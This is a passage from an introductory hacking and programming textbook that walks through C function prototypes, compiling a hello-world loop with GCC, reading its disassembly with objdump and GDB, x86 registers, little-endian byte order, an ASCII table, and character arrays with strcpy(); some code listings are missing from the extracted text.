This can be done by simply writing the entire function before using it\nlater in the program or by using function prototypes. A function prototype is\nsimply a way to tell the compiler to expect a function with this name, this\nreturn data type, and these data types as its functional arguments. The actual\nfunction can be located near the end of the program, but it can be used any-\nwhere else, since the compiler already knows about it. An example of a func-\ntion prototype for the factorial() function would look something like this:\nUsually, function prototypes are located near the beginning of a program.\nThere\u2019s no need to actually define any variable names in the prototype, since\nthis is done in the actual function. The only thing the compiler cares about is\nthe function\u2019s name, its return data type, and the data types of its functional\nIf a function doesn\u2019t have any value to return, it should be declared as void,\nas is the case with the turn() function I used as an example earlier. However,\nthe turn() function doesn\u2019t yet capture all the functionality that our driving\ndirections need. Every turn in the directions has both a direction and a street\nname. This means that a turning function should have two variables: the\ndirection to turn and the street to turn on to. This complicates the function\nof turning, since the proper street must be located before the turn can be\nmade. A more complete turning function using proper C-like syntax is listed\nwhile(current_intersection_name != target_street_name)\nTurn the steering wheel right back to the original position;\nThis function includes a section that searches for the proper intersection\nby looking for street signs, reading the name on each street sign, and storing\nthat name in a variable called current_intersection_name. It will continue to\nlook for and read street signs until the target street is found; at that point, the\nremaining turning instructions will be executed. The pseudo-code driving\ninstructions can now be changed to use this turning function.\nFunctions aren\u2019t commonly used in pseudo-code, since pseudo-code is\nmostly used as a way for programmers to sketch out program concepts before\nwriting compilable code. Since pseudo-code doesn\u2019t actually have to work,\nfull functions don\u2019t need to be written out\u2014simply jotting down Do some\ncomplex stuff here will suffice. But in a programming language like C, functions\nare used heavily. Most of the real usefulness of C comes from collections of\nNow that the syntax of C feels more familiar and some fundamental program-\nming concepts have been explained, actually programming in C isn\u2019t that big\nof a step. C compilers exist for just about every operating system and processor\narchitecture out there, but for this book, Linux and an x 86-based processor\nwill be used exclusively. Linux is a free operating system that everyone has\naccess to, and x86-based processors are the most popular consumer-grade\nprocessor on the planet. Since hacking is really about experimenting, it\u2019s\nprobably best if you have a C compiler to follow along with.\nIncluded with this book is a LiveCD you can use to follow along if your\ncomputer has an x86 processor. Just put the CD in the drive and reboot\nyour computer. It will boot into a Linux environment without modifying your\nexisting operating system. From this Linux environment you can follow\nLet\u2019s get right to it. The firstprog.c program is a simple piece of C code\nputs(\"Hello, world!\\n\");  // put the string to the output.\nreturn 0;                   // Tell OS the program exited without errors.\nThe main execution of a C program begins in the aptly named main()\nfunction. Any text following two forward slashes (//) is a comment, which is\nThe first line may be confusing, but it\u2019s just C syntax that tells the com-\npiler to include headers for a standard input/output (I/O) library named\nstdio. This header file is added to the program when it is compiled. It is\nlocated at /usr/include/stdio.h, and it defines several constants and func-\ntion prototypes for corresponding functions in the standard I/O library.\nSince the main() function uses the printf() function from the standard I/O\nlibrary, a function prototype is needed for printf() before it can be used.\nThis function prototype (along with many others) is included in the stdio.h\nheader file. A lot of the power of C comes from its extensibility and libraries.\nThe rest of the code should make sense and look a lot like the pseudo-code\nfrom before. You may have even noticed that there\u2019s a set of curly braces that\ncan be eliminated. It should be fairly obvious what this program will do, but\nlet\u2019s compile it using GCC and run it just to make sure.\nThe GNU Compiler Collection (GCC) is a free C compiler that translates C\ninto machine language that a processor can understand. The outputted trans-\nlation is an executable binary file, which is called a.out by default. Does the\n-rwxr-xr-x 1 reader reader 6621 2007-09-06 22:16 a.out\nOkay, this has all been stuff you would learn in an elementary programming\nclass\u2014basic, but essential.  Most introductory programming classes just teach\nhow to read and write C. Don\u2019t get me wrong, being fluent in C is very useful\nand is enough to make you a decent programmer, but it\u2019s only a piece of the\nbigger picture. Most programmers learn the language from the top down\nand never see the big picture. Hackers get their edge from knowing how all\nthe pieces interact within this bigger picture. To see the bigger picture in the\nrealm of programming, simply realize that C code is meant to be compiled.\nThe code can\u2019t actually do anything until it\u2019s compiled into an executable\nbinary file. Thinking of C-source as a program is a common misconception\nthat is exploited by hackers every day. The binary a.out\u2019s instructions are\nwritten in machine language, an elementary language the CPU can under-\nstand. Compilers are designed to translate the language of C code into machine\nlanguage for a variety of processor architectures. In this case, the processor\nis in a family that uses the x86 architecture. There are also Sparc processor\narchitectures (used in Sun Workstations) and the PowerPC processor arch-\nitecture (used in pre-Intel Macs). Each architecture has a different machine\nlanguage, so the compiler acts as a middle ground\u2014translating C code into\nAs long as the compiled program works, the average programmer is\nonly concerned with source code. But a hacker realizes that the compiled\nprogram is what actually gets executed out in the real world. With a better\nunderstanding of how the CPU operates, a hacker can manipulate the pro-\ngrams that run on it. We have seen the source code for our first program and\ncompiled it into an executable binary for the x86 architecture. But what does\nthis executable binary look like? The GNU development tools include a pro-\ngram called objdump, which can be used to examine compiled binaries. Let\u2019s\nstart by looking at the machine code the main() function was translated into.\nreader@hacking:~/booksrc $ objdump -D a.out | grep -A20 main.:\n8048375:       89 e5                   mov    %esp,%ebp\n8048377:       83 ec 08                sub    $0x8,%esp\n804837a:       83 e4 f0                and    $0xfffffff0,%esp\n804837d:       b8 00 00 00 00          mov    $0x0,%eax\n8048382:       29 c4                   sub    %eax,%esp\n8048384:       c7 45 fc 00 00 00 00    movl   $0x0,0xfffffffc(%ebp)\n804838b:       83 7d fc 09             cmpl   $0x9,0xfffffffc(%ebp)\n804838f:       7e 02                   jle    8048393 <main+0x1f>\n8048391:       eb 13                   jmp    80483a6 <main+0x32>\n8048393:       c7 04 24 84 84 04 08    movl   $0x8048484,(%esp)\n804839a:       e8 01 ff ff ff          call   80482a0 <printf@plt>\n804839f:       8d 45 fc                lea    0xfffffffc(%ebp),%eax\n80483a2:       ff 00                   incl   (%eax)\n80483a4:       eb e5                   jmp    804838b <main+0x17>\nThe objdump program will spit out far too many lines of output to\nsensibly examine, so the output is piped into grep with the command-line\noption to only display 20 lines after the regular expression main.:. Each byte\nis represented in hexadecimal notation, which is a base-16 numbering system. The\nnumbering system you are most familiar with uses a base-10 system, since at\n10 you need to add an extra symbol. Hexadecimal uses 0 through 9 to\nrepresent 0 through 9, but it also uses A through F to represent the values\n10 through 15. This is a convenient notation since a byte contains 8 bits, each\nof which can be either true or false. This means a byte has 256 (28) possible\nvalues, so each byte can be described with 2 hexadecimal digits.\nThe hexadecimal numbers\u2014starting with 0x8048374 on the far left\u2014are\nmemory addresses. The bits of the machine language instructions must be\nput somewhere, and this somewhere is called memory. Memory is just a\ncollection of bytes of temporary storage space that are numbered with\nLike a row of houses on a local street, each with its own address, memory\ncan be thought of as a row of bytes, each with its own memory address. Each\nbyte of memory can be accessed by its address, and in this case the CPU\naccesses this part of memory to retrieve the machine language instructions\nthat make up the compiled program. Older Intel x86 processors use a 32-bit\naddressing scheme, while newer ones use a 64-bit one. The 32-bit processors\nhave 232 (or 4,294,967,296) possible addresses, while the 64-bit ones have 264\n(1.84467441 \u00d7 1019) possible addresses. The 64-bit processors can run in\n32-bit compatibility mode, which allows them to run 32-bit code quickly.\nThe hexadecimal bytes in the middle of the listing above are the machine\nlanguage instructions for the x86 processor. Of course, these hexadecimal values\nare only representations of the bytes of binary 1s and 0s the CPU can under-\nstand. But since 0101010110001001111001011000001111101100111100001 . . .\nisn\u2019t very useful to anything other than the processor, the machine code is\ndisplayed as hexadecimal bytes and each instruction is put on its own line,\nCome to think of it, the hexadecimal bytes really aren\u2019t very useful them-\nselves, either\u2014that\u2019s where assembly language comes in. The instructions on\nthe far right are in assembly language. Assembly language is really just a col-\nlection of mnemonics for the corresponding machine language instructions.\nThe instruction ret is far easier to remember and make sense of than 0xc3 or\n11000011. Unlike C and other compiled languages, assembly language instruc-\ntions have a direct one-to-one relationship with their corresponding machine\nlanguage instructions. This means that since every processor architecture has\ndifferent machine language instructions, each also has a different form of\nassembly language. Assembly is just a way for programmers to represent the\nmachine language instructions that are given to the processor. Exactly how\nthese machine language instructions are represented is simply a matter of\nconvention and preference. While you can theoretically create your own x86\nassembly language syntax, most people stick with one of the two main types:\nAT&T syntax and Intel syntax. The assembly shown in the output on page 21\nis AT&T syntax, as just about all of Linux\u2019s disassembly tools use this syntax by\ndefault. It\u2019s easy to recognize AT&T syntax by the cacophony of % and $ symbols\nprefixing everything (take a look again at the example on page 21). The same\ncode can be shown in Intel syntax by providing an additional command-line\noption, -M intel, to objdump, as shown in the output below.\nreader@hacking:~/booksrc $ objdump -M intel -D a.out | grep -A20 main.:\n8048375:       89 e5                   mov    ebp,esp\n8048377:       83 ec 08                sub    esp,0x8\n804837a:       83 e4 f0                and    esp,0xfffffff0\n804837d:       b8 00 00 00 00          mov    eax,0x0\n8048382:       29 c4                   sub    esp,eax\n8048384:       c7 45 fc 00 00 00 00    mov    DWORD PTR [ebp-4],0x0\n804838b:       83 7d fc 09             cmp    DWORD PTR [ebp-4],0x9\n804838f:       7e 02                   jle    8048393 <main+0x1f>\n8048391:       eb 13                   jmp    80483a6 <main+0x32>\n8048393:       c7 04 24 84 84 04 08    mov    DWORD PTR [esp],0x8048484\n804839a:       e8 01 ff ff ff          call   80482a0 <printf@plt>\n804839f:       8d 45 fc                lea    eax,[ebp-4]\n80483a2:       ff 00                   inc    DWORD PTR [eax]\n80483a4:       eb e5                   jmp    804838b <main+0x17>\nPersonally, I think Intel syntax is much more readable and easier to\nunderstand, so for the purposes of this book, I will try to stick with this syntax.\nRegardless of the assembly language representation, the commands a pro-\ncessor understands are quite simple. These instructions consist of an oper-\nation and sometimes additional arguments that describe the destination\nand/or the source for the operation. These operations move memory\naround, perform some sort of basic math, or interrupt the processor to get it\nto do something else. In the end, that\u2019s all a computer processor can really\ndo. But in the same way millions of books have been written using a relatively\nsmall alphabet of letters, an infinite number of possible programs can be\ncreated using a relatively small collection of machine instructions.\nProcessors also have their own set of special variables called registers. Most\nof the instructions use these registers to read or write data, so understanding\nthe registers of a processor is essential to understanding the instructions.\nThe 8086 CPU was the first x86 processor. It was developed and manufactured\nby Intel, which later developed more advanced processors in the same\nfamily: the 80186, 80286, 80386, and 80486. If you remember people talking\nabout 386 and 486 processors in the \u201980s and \u201990s, this is what they were\nThe x86 processor has several registers, which are like internal variables\nfor the processor. I could just talk abstractly about these registers now, but\nI think it\u2019s always better to see things for yourself. The GNU development\ntools also include a debugger called GDB. Debuggers are used by program-\nmers to step through compiled programs, examine program memory, and\nview processor registers. A programmer who has never used a debugger to\nlook at the inner workings of a program is like a seventeenth-century doctor\nwho has never used a microscope. Similar to a microscope, a debugger allows\na hacker to observe the microscopic world of machine code\u2014but a debugger is\nfar more powerful than this metaphor allows. Unlike a microscope, a debugger\ncan view the execution from all angles, pause it, and change anything along\nBelow, GDB is used to show the state of the processor registers right before\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\nA breakpoint is set on the main() function so execution will stop right\nbefore our code is executed. Then GDB runs the program, stops at the\nbreakpoint, and is told to display all the processor registers and their\nThe first four registers (EAX, ECX, EDX, and EBX) are known as general-\npurpose registers. These are called the Accumulator, Counter, Data, and Base\nregisters, respectively. They are used for a variety of purposes, but they mainly\nact as temporary variables for the CPU when it is executing machine\nThe second four registers (ESP, EBP, ESI, and EDI) are also general-\npurpose registers, but they are sometimes known as pointers and indexes.\nThese stand for Stack Pointer, Base Pointer, Source Index, and Destination Index,\nrespectively. The first two registers are called pointers because they store 32-bit\naddresses, which essentially point to that location in memory. These registers\nare fairly important to program execution and memory management; we will\ndiscuss them more later. The last two registers are also technically pointers,\nwhich are commonly used to point to the source and destination when data\nneeds to be read from or written to. There are load and store instructions\nthat use these registers, but for the most part, these registers can be thought\nThe EIP register is the Instruction Pointer register, which points to the\ncurrent instruction the processor is reading. Like a child pointing his finger\nat each word as he reads, the processor reads each instruction using the EIP\nregister as its finger. Naturally, this register is quite important and will be used\na lot while debugging. Currently, it points to a memory address at 0x804838a.\nThe remaining EFLAGS register actually consists of several bit flags that\nare used for comparisons and memory segmentations. The actual memory is\nsplit into several different segments, which will be discussed later, and these\nregisters keep track of that. For the most part, these registers can be ignored\nSince we are using Intel syntax assembly language for this book, our tools\nmust be configured to use this syntax. Inside GDB, the disassembly syntax\ncan be set to Intel by simply typing set disassembly intel or set dis intel,\nfor short. You can configure this setting to run every time GDB starts up by\nputting the command in the file .gdbinit in your home directory.\nreader@hacking:~/booksrc $ echo \"set dis intel\" > ~/.gdbinit\nNow that GDB is configured to use Intel syntax, let\u2019s begin understanding\nit. The assembly instructions in Intel syntax generally follow this style:\nThe destination and source values will either be a register, a memory\naddress, or a value. The operations are usually intuitive mnemonics: The mov\noperation will move a value from the source to the destination, sub will\nsubtract, inc will increment, and so forth. For example, the instructions\nbelow will move the value from ESP to EBP and then subtract 8 from ESP\n8048375:       89 e5                   mov    ebp,esp\n8048377:       83 ec 08                sub    esp,0x8\nThere are also operations that are used to control the flow of execution.\nThe cmp operation is used to compare values, and basically any operation\nbeginning with j is used to jump to a different part of the code (depending\non the result of the comparison). The example below first compares a 4-byte\nvalue located at EBP minus 4 with the number 9. The next instruction is short-\nhand for jump if less than or equal to, referring to the result of the previous\ncomparison. If that value is less than or equal to 9, execution jumps to the\ninstruction at 0x8048393. Otherwise, execution flows to the next instruction\nwith an unconditional jump. If the value isn\u2019t less than or equal to 9, exe-\n804838b:       83 7d fc 09             cmp    DWORD PTR [ebp-4],0x9\n804838f:       7e 02                   jle    8048393 <main+0x1f>\n8048391:       eb 13                   jmp    80483a6 <main+0x32>\nThese examples have been from our previous disassembly, and we have\nour debugger configured to use Intel syntax, so let\u2019s use the debugger to step\nthrough the first program at the assembly instruction level.\nThe -g flag can be used by the GCC compiler to include extra debugging\ninformation, which will give GDB access to the source code.\nUsing host libthread_db library \"/lib/libthread_db.so.1\".\n0x08048394 <main+16>:   mov    DWORD PTR [ebp-4],0x0\n0x0804839b <main+23>:   cmp    DWORD PTR [ebp-4],0x9\n0x080483a3 <main+31>:   mov    DWORD PTR [esp],0x80484d4\n0x080483aa <main+38>:   call   0x80482a8 <_init+56>\nBreakpoint 1 at 0x8048394: file firstprog.c, line 6.\nFirst, the source code is listed and the disassembly of the main() function\nis displayed. Then a breakpoint is set at the start of main(), and the program is\nrun. This breakpoint simply tells the debugger to pause the execution of the\nprogram when it gets to that point. Since the breakpoint has been set at the\nstart of the main() function, the program hits the breakpoint and pauses\nbefore actually executing any instructions in main(). Then the value of EIP\nNotice that EIP contains a memory address that points to an instruction in\nthe main() function\u2019s disassembly (shown in bold). The instructions before this\n(shown in italics) are collectively known as the function prologue and are gen-\nerated by the compiler to set up memory for the rest of the main() function\u2019s\nlocal variables. Part of the reason variables need to be declared in C is to aid\nthe construction of this section of code. The debugger knows this part of the\ncode is automatically generated and is smart enough to skip over it. We\u2019ll talk\nmore about the function prologue later, but for now we can take a cue from\nThe GDB debugger provides a direct method to examine memory, using\nthe command x, which is short for examine. Examining memory is a critical\nskill for any hacker. Most hacker exploits are a lot like magic tricks\u2014they\nseem amazing and magical, unless you know about sleight of hand and\nmisdirection. In both magic and hacking, if you were to look in just the right\nspot, the trick would be obvious. That\u2019s one of the reasons a good magician\nnever does the same trick twice. But with a debugger like GDB, every aspect\nof a program\u2019s execution can be deterministically examined, paused, stepped\nthrough, and repeated as often as needed. Since a running program is mostly\njust a processor and segments of memory, examining memory is the first way\nThe examine command in GDB can be used to look at a certain address\nof memory in a variety of ways. This command expects two arguments when\nit\u2019s used: the location in memory to examine and how to display that memory.\nThe display format also uses a single-letter shorthand, which is optionally\npreceded by a count of how many items to examine. Some common format\nThese can be used with the examine command to examine a certain\nmemory address. In the following example, the current address of the EIP\nregister is used. Shorthand commands are often used with GDB, and even\ninfo register eip can be shortened to just i r eip.\neip            0x8048384        0x8048384 <main+16>\n0x8048384 <main+16>:    00000000111111000100010111000111\nThe memory the EIP register is pointing to can be examined by using the\naddress stored in EIP. The debugger lets you reference registers directly, so $eip\nis equivalent to the value EIP contains at that moment. The value 077042707 in\noctal is the same as 0x00fc45c7 in hexadecimal, which is the same as 16532935 in\nbase-10 decimal, which in turn is the same as 00000000111111000100010111000111\nin binary. A number can also be prepended to the format of the examine com-\nmand to examine multiple units at the target address.\n0x8048384 <main+16>:    0x00fc45c7      0x83000000      0x7e09fc7d      0xc713eb02\n0x8048394 <main+32>:    0x84842404      0x01e80804      0x8dffffff      0x00fffc45\n0x80483a4 <main+48>:    0xc3c9e5eb      0x90909090      0x90909090      0x5de58955\nThe default size of a single unit is a four-byte unit called a word. The size\nof the display units for the examine command can be changed by adding a\nsize letter to the end of the format letter. The valid size letters are as follows:\nThis is slightly confusing, because sometimes the term word also refers to\n2-byte values. In this case a double word or DWORD refers to a 4-byte value. In this\nbook, words and DWORDs both refer to 4-byte values. If I\u2019m talking about a\n2-byte value, I\u2019ll call it a short or a halfword. The following GDB output shows\n0x8048384 <main+16>:    0xc7    0x45    0xfc    0x00    0x00    0x00    0x00    0x83\n0x8048384 <main+16>:    0x45c7  0x00fc  0x0000  0x8300  0xfc7d  0x7e09  0xeb02  0xc713\n0x8048384 <main+16>:    0x00fc45c7      0x83000000      0x7e09fc7d      0xc713eb02\n0x8048394 <main+32>:    0x84842404      0x01e80804      0x8dffffff      0x00fffc45\nIf you look closely, you may notice something odd about the data above.\nThe first examine command shows the first eight bytes, and naturally, the\nexamine commands that use bigger units display more data in total. However,\nthe first examine shows the first two bytes to be 0xc7 and 0x45, but when a\nhalfword is examined at the exact same memory address, the value 0x45c7 is\nshown, with the bytes reversed. This same byte-reversal effect can be seen\nwhen a full four-byte word is shown as 0x00fc45c7, but when the first four bytes\nare shown byte by byte, they are in the order of 0xc7, 0x45, 0xfc, and 0x00.\nThis is because on the x86 processor values are stored in little-endian\nbyte order, which means the least significant byte is stored first. For example,\nif four bytes are to be interpreted as a single value, the bytes must be used\nin reverse order. The GDB debugger is smart enough to know how values\nare stored, so when a word or halfword is examined, the bytes must be\nreversed to display the correct values in hexadecimal. Revisiting these\nvalues displayed both as hexadecimal and unsigned decimals might help\n0x8048384 <main+16>:    0xc7    0x45    0xfc    0x00\nThe first four bytes are shown both in hexadecimal and standard unsigned\ndecimal notation. A command-line calculator program called bc is used to show\nthat if the bytes are interpreted in the incorrect order, a horribly incorrect\nvalue of 3343252480 is the result. The byte order of a given architecture is an\nimportant detail to be aware of. While most debugging tools and compilers\nwill take care of the details of byte order automatically, eventually you will\nIn addition to converting byte order, GDB can do other conversions with\nthe examine command. We\u2019ve already seen that GDB can disassemble machine\nlanguage instructions into human-readable assembly instructions. The examine\ncommand also accepts the format letter i, short for instruction, to display the\nmemory as disassembled assembly language instructions.\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\nBreakpoint 1 at 0x8048384: file firstprog.c, line 6.\neip            0x8048384        0x8048384 <main+16>\n0x8048384 <main+16>:    mov    DWORD PTR [ebp-4],0x0\n0x8048384 <main+16>:    mov    DWORD PTR [ebp-4],0x0\n0x804838b <main+23>:    cmp    DWORD PTR [ebp-4],0x9\n0x8048384 <main+16>:    0xc7    0x45    0xfc    0x00    0x00    0x00    0x00\n0x8048384 <main+16>:    mov    DWORD PTR [ebp-4],0x0\nIn the output above, the a.out program is run in GDB, with a breakpoint\nset at main(). Since the EIP register is pointing to memory that actually con-\ntains machine language instructions, they disassemble quite nicely.\nThe previous objdump disassembly confirms that the seven bytes EIP is\npointing to actually are machine language for the corresponding assembly\n8048384:       c7 45 fc 00 00 00 00    mov    DWORD PTR [ebp-4],0x0\nThis assembly instruction will move the value of 0 into memory located\nat the address stored in the EBP register, minus 4. This is where the C vari-\nable i is stored in memory; i was declared as an integer that uses 4 bytes of\nmemory on the x86 processor. Basically, this command will zero out the\nvariable i for the for loop. If that memory is examined right now, it will\ncontain nothing but random garbage. The memory at this location can be\nThe EBP register is shown to contain the address 0xbffff808, and the\nassembly instruction will be writing to a value offset by 4 less than that,\n0xbffff804. The examine command can examine this memory address\ndirectly or by doing the math on the fly. The print command can also be\nused to do simple math, but the result is stored in a temporary variable in\nthe debugger. This variable named $1 can be used later to quickly re-access\na particular location in memory. Any of the methods shown above will accom-\nplish the same task: displaying the 4 garbage bytes found in memory that\nwill be zeroed out when the current instruction executes.\nLet\u2019s execute the current instruction using the command nexti, which is\nshort for next instruction. The processor will read the instruction at EIP, execute\neip            0x804838b        0x804838b <main+23>\n0x804838b <main+23>:    cmp    DWORD PTR [ebp-4],0x9\nAs predicted, the previous command zeroes out the 4 bytes found at EBP\nminus 4, which is memory set aside for the C variable i. Then EIP advances to\nthe next instruction. The next few instructions actually make more sense to\n0x804838b <main+23>:    cmp    DWORD PTR [ebp-4],0x9\n0x8048393 <main+31>:    mov    DWORD PTR [esp],0x8048484\n0x804839a <main+38>:    call   0x80482a0 <printf@plt>\nThe first instruction, cmp, is a compare instruction, which will compare\nthe memory used by the C variable i with the value 9. The next instruction,\njle stands for jump if less than or equal to. It uses the results of the previous\ncomparison (which are actually stored in the EFLAGS register) to jump EIP\nto point to a different part of the code if the destination of the previous\ncomparison operation is less than or equal to the source. In this case the\ninstruction says to jump to the address 0x8048393 if the value stored in memory\nfor the C variable i is less than or equal to the value 9. If this isn\u2019t the case,\nthe EIP will continue to the next instruction, which is an unconditional jump\ninstruction. This will cause the EIP to jump to the address 0x80483a6. These\nthree instructions combine to create an if-then-else control structure: If the i\nis less than or equal to 9, then go to the instruction at address 0x8048393; otherwise,\ngo to the instruction at address 0x80483a6. The first address of 0x8048393 (shown in\nbold) is simply the instruction found after the fixed jump instruction, and\nthe second address of 0x80483a6 (shown in italics) is located at the end of the\nSince we know the value 0 is stored in the memory location being com-\npared with the value 9, and we know that 0 is less than or equal to 9, EIP\nshould be at 0x8048393 after executing the next two instructions.\neip            0x8048393        0x8048393 <main+31>\n0x8048393 <main+31>:    mov    DWORD PTR [esp],0x8048484\n0x804839a <main+38>:    call   0x80482a0 <printf@plt>\nAs expected, the previous two instructions let the program execution\nflow down to 0x8048393, which brings us to the next two instructions. The\nfirst instruction is another mov instruction that will write the address 0x8048484\ninto the memory address contained in the ESP register. But what is ESP\nCurrently, ESP points to the memory address 0xbffff800, so when the mov\ninstruction is executed, the address 0x8048484 is written there. But why? What\u2019s\nso special about the memory address 0x8048484? There\u2019s one way to find out.\n0x8048484:      0x48    0x65    0x6c    0x6c    0x6f    0x20\n0x8048484:      72      101     108     108     111     32\nA trained eye might notice something about the memory here, in par-\nticular the range of the bytes. After examining memory for long enough,\nthese types of visual patterns become more apparent. These bytes fall within\nthe printable ASCII range. ASCII is an agreed-upon standard that maps\nall the characters on your keyboard (and some that aren\u2019t) to fixed numbers.\nThe bytes 0x48, 0x65, 0x6c, and 0x6f all correspond to letters in the alphabet on\nthe ASCII table shown below. This table is found in the man page for ASCII,\navailable on most Unix systems by typing man ascii.\nOct   Dec   Hex   Char           Oct   Dec   Hex   Char\n------------------------------------------------------------\n000   0     00    NUL '\\0'       100   64    40    @\n001   1     01    SOH            101   65    41    A\n002   2     02    STX            102   66    42    B\n003   3     03    ETX            103   67    43    C\n004   4     04    EOT            104   68    44    D\n005   5     05    ENQ            105   69    45    E\n006   6     06    ACK            106   70    46    F\n007   7     07    BEL '\\a'       107   71    47    G\n010   8     08    BS  '\\b'       110   72    48    H\n011   9     09    HT  '\\t'       111   73    49    I\n012   10    0A    LF  '\\n'       112   74    4A    J\n013   11    0B    VT  '\\v'       113   75    4B    K\n014   12    0C    FF  '\\f'       114   76    4C    L\n015   13    0D    CR  '\\r'       115   77    4D    M\n016   14    0E    SO             116   78    4E    N\n017   15    0F    SI             117   79    4F    O\n020   16    10    DLE            120   80    50    P\n021   17    11    DC1            121   81    51    Q\n022   18    12    DC2            122   82    52    R\n023   19    13    DC3            123   83    53    S\n024   20    14    DC4            124   84    54    T\n025   21    15    NAK            125   85    55    U\n026   22    16    SYN            126   86    56    V\n027   23    17    ETB            127   87    57    W\n030   24    18    CAN            130   88    58    X\n031   25    19    EM             131   89    59    Y\n032   26    1A    SUB            132   90    5A    Z\n033   27    1B    ESC            133   91    5B    [\n034   28    1C    FS             134   92    5C    \\   '\\\\'\n035   29    1D    GS             135   93    5D    ]\n036   30    1E    RS             136   94    5E    ^\n037   31    1F    US             137   95    5F    _\n040   32    20    SPACE          140   96    60    `\n041   33    21    !              141   97    61    a\n042   34    22    \"              142   98    62    b\n043   35    23    #              143   99    63    c\n044   36    24    $              144   100   64    d\n045   37    25    %              145   101   65    e\n046   38    26    &              146   102   66    f\n047   39    27    '              147   103   67    g\n050   40    28    (              150   104   68    h\n051   41    29    )              151   105   69    i\n052   42    2A    *              152   106   6A    j\n053   43    2B    +              153   107   6B    k\n055   45    2D    -              155   109   6D    m\n056   46    2E    .              156   110   6E    n\n060   48    30    0              160   112   70    p\n061   49    31    1              161   113   71    q\n062   50    32    2              162   114   72    r\n063   51    33    3              163   115   73    s\n064   52    34    4              164   116   74    t\n065   53    35    5              165   117   75    u\n066   54    36    6              166   118   76    v\n067   55    37    7              167   119   77    w\n070   56    38    8              170   120   78    x\n071   57    39    9              171   121   79    y\n072   58    3A    :              172   122   7A    z\n073   59    3B    ;              173   123   7B    {\n074   60    3C    <              174   124   7C    |\n075   61    3D    =              175   125   7D    }\n076   62    3E    >              176   126   7E    ~\n077   63    3F    ?              177   127   7F    DEL\nThankfully, GDB\u2019s examine command also contains provisions for look-\ning at this type of memory. The c format letter can be used to automatically\nlook up a byte on the ASCII table, and the s format letter will display an\n0x8048484:      72 'H'  101 'e' 108 'l' 108 'l' 111 'o' 32 ' '\nThese commands reveal that the data string \"Hello, world!\\n\" is stored at\nmemory address 0x8048484. This string is the argument for the printf() func-\ntion, which indicates that moving the address of this string to the address\nstored in ESP (0x8048484) has something to do with this function. The following\noutput shows the data string\u2019s address being moved into the address ESP is\n0x8048393 <main+31>:    mov    DWORD PTR [esp],0x8048484\n0x804839a <main+38>:    call   0x80482a0 <printf@plt>\n0x0804839a      8           printf(\"Hello, world!\\n\");\nThe next instruction is actually called the printf() function; it prints the\ndata string. The previous instruction was setting up for the function call, and\nthe results of the function call can be seen in the output below in bold.\n0x804839a <main+38>:    call   0x80482a0 <printf@plt>\nContinuing to use GDB to debug, let\u2019s examine the next two instructions.\nOnce again, they make more sense to look at in a group.\nThese two instructions basically just increment the variable i by 1. The\nlea instruction is an acronym for Load Effective Address, which will load the\nfamiliar address of EBP minus 4 into the EAX register. The execution of this\nThe following inc instruction will increment the value found at this address\n(now stored in the EAX register) by 1. The execution of this instruction is also\nThe end result is the value stored at the memory address EBP minus 4\n(0xbffff804), incremented by 1. This behavior corresponds to a portion of C\ncode in which the variable i is incremented in the for loop.\nThe next instruction is an unconditional jump instruction.\nWhen this instruction is executed, it will send the program back to the\ninstruction at address 0x804838b. It does this by simply setting EIP to that value.\nLooking at the full disassembly again, you should be able to tell which\nparts of the C code have been compiled into which machine instructions.\n0x08048384 <main+16>:   mov    DWORD PTR [ebp-4],0x0\n0x0804838b <main+23>:   cmp    DWORD PTR [ebp-4],0x9\n0x08048393 <main+31>:   mov    DWORD PTR [esp],0x8048484\n0x0804839a <main+38>:   call   0x80482a0 <printf@plt>\nThe instructions shown in bold make up the for loop, and the instruc-\ntions in italics are the printf() call found within the loop. The program exe-\ncution will jump back to the compare instruction, continue to execute the\nprintf() call, and increment the counter variable until it finally equals 10. At\nthis point the conditional jle instruction won\u2019t execute; instead, the instruc-\ntion pointer will continue to the unconditional jump instruction, which exits\nNow that the idea of programming is less abstract, there are a few other\nimportant concepts to know about C. Assembly language and computer\nprocessors existed before higher-level programming languages, and many\nmodern programming concepts have evolved through time. In the same way\nthat knowing a little about Latin can greatly improve one\u2019s understanding of\nthe English language, knowledge of low-level programming concepts can\nassist the comprehension of higher-level ones. When continuing to the next\nsection, remember that C code must be compiled into machine instructions\nThe value \"Hello, world!\\n\" passed to the printf() function in the previous\nprogram is a string\u2014technically, a character array. In C, an array is simply a\nlist of n elements of a specific data type. A 20-character array is simply 20\nadjacent characters located in memory. Arrays are also referred to as buffers.\nThe char_array.c program is an example of a character array.\nThe GCC compiler can also be given the -o switch to define the output\nfile to compile to. This switch is used below to compile the program into an\nreader@hacking:~/booksrc $ gcc -o char_array char_array.c\nIn the preceding program, a 20-element character array is defined as\nstr_a, and each element of the array is written to, one by one. Notice that the\nnumber begins at 0, as opposed to 1. Also notice that the last character is a 0.\n(This is also called a null byte.) The character array was defined, so 20 bytes\nare allocated for it, but only 12 of these bytes are actually used. The null byte\nat the end is used as a delimiter character to tell any function that is dealing\nwith the string to stop operations right there. The remaining extra bytes are\njust garbage and will be ignored. If a null byte is inserted in the fifth element\nof the character array, only the characters Hello would be printed by the\nSince setting each character in a character array is painstaking and\nstrings are used fairly often, a set of standard functions was created for string\nmanipulation. For example, the strcpy() function will copy a string from a\nsource to a destination, iterating through the source string and copying each\nbyte to the destination (and stopping after it copies the null termination byte).\nThe order of the function\u2019s arguments is similar to Intel assembly syntax:\ndestination first and then source. The char_array.c program can be rewritten\nusing strcpy() to accomplish the same thing using the string library.  The\nnext version of the char_array program shown below includes string.h since\nLet\u2019s take a look at this program with GDB. In the output below, the\ncompiled program is opened with GDB and breakpoints are set before, in, and\nafter the strcpy() call shown in bold. The debugger will pause the program at\neach breakpoint, giving us a chance to examine registers and memory. The\nstrcpy() function\u2019s code comes from a shared library, so the breakpoint in this\nfunction can\u2019t actually be set until the program is executed.\nreader@hacking:~/booksrc $ gcc -g -o char_array2 char_array2.c\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\nBreakpoint 1 at 0x80483c4: file char_array2.c, line 6.\nMake breakpoint pending on future shared library load? (y or [n]) y\nBreakpoint 3 at 0x80483d7: file char_array2.c, line 8.\nWhen the program is run, the strcpy() breakpoint is resolved. At each\nbreakpoint, we\u2019re going to look at EIP and the instructions it points to. Notice\nthat the memory location for EIP at the middle breakpoint is different.\neip            0x80483c4        0x80483c4 <main+16>\n0x80483c4 <main+16>:    mov    DWORD PTR [esp+4],0x80484c4\n0x80483d2 <main+30>:    call   0x80482c4 